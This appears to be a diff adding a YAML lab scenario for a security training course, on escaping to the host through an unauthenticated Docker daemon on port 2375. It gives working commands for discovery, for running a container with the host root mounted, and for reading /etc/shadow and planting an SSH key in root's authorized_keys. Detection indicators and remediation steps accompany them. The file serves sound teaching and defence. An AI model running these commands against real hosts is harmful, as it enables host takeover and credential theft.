@@ -1,0 +1,97 @@
+# Category: Container Security
+name: "Docker Socket Exposure – Container Escape and Host Access"
+id: "container-docker-socket-001"
+category: "container_security"
+subcategory: "docker"
+difficulty: "intermediate"
+estimated_time: "60 minutes"
+
+description: |
+  Exploit a publicly exposed Docker Unix socket (or TCP port 2375) to
+  interact with the Docker daemon. An attacker can create new containers,
+  mount the host filesystem, and achieve container escape to the host.
+
+learning_objectives:
+  - Understand Docker API and its risks
+  - Identify exposed Docker sockets
+  - Use `docker` CLI with remote socket to spawn privileged containers
+  - Mount host root and access host files
+
+tools:
+  - Docker CLI
+  - curl (REST API)
+  - Python (docker-py)
+
+prerequisites:
+  - Docker daemon exposed on TCP (e.g., 2375) or accessible UNIX socket
+  - No authentication (default)
+
+steps:
+  - id: "step1"
+    phase: "discovery"
+    action: "Check if Docker daemon is exposed"
+    commands:
+      - "# Check port 2375"
+      - "nmap -p 2375 <TARGET>"
+      - "# Or use curl to query API"
+      - "curl http://<TARGET>:2375/version"
+    expected_output: "Docker version information"
+    detection: "Docker daemon logs show API connections"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Create a privileged container with host root mount"
+    commands:
+      - "# Using docker client with -H"
+      - "docker -H tcp://<TARGET>:2375 run --rm -it -v /:/host ubuntu bash"
+      - "# Then inside container, access /host"
+    expected_output: "Root shell on container; host filesystem mounted"
+    detection: "Container creation events; audit logs"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Read host sensitive files, add SSH keys, etc."
+    commands:
+      - "# cat /host/etc/shadow"
+      - "# Write SSH key to /host/root/.ssh/authorized_keys"
+    expected_output: "Host root access"
+    detection: "SSH key addition logs"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1610"
+    description: "Deploy Container"
+  - standard: "CIS Docker Benchmark"
+    control: "1.1"
+    description: "Ensure daemon is not exposed to TCP"
+
+detection:
+  network_indicators:
+    - "Traffic to port 2375 (or 2376 for TLS)"
+  log_indicators:
+    - "Docker daemon logs with API calls"
+  endpoint_indicators:
+    - "New privileged containers"
+
+remediation:
+  immediate:
+    - "Expose Docker daemon only via UNIX socket"
+    - "Enable TLS and authentication for remote access"
+  long_term:
+    - "Use container orchestration with RBAC (e.g., Kubernetes with policies)"
+    - "Regularly audit exposed ports"
+
+variables:
+  target_ip: "10.0.0.40"
+  docker_port: "2375"
+
+assessment_questions:
+  - "What risks are associated with exposing the Docker socket?"
+  - "How can you secure the Docker daemon for remote access?"
+  - "What is the difference between hostPath and Docker socket mounts?"
+
+references:
+  - url: "https://docs.docker.com/engine/security/"
+    title: "Docker Security"
+  - url: "https://www.cisecurity.org/benchmark/docker/"
+    title: "CIS Docker Benchmark"
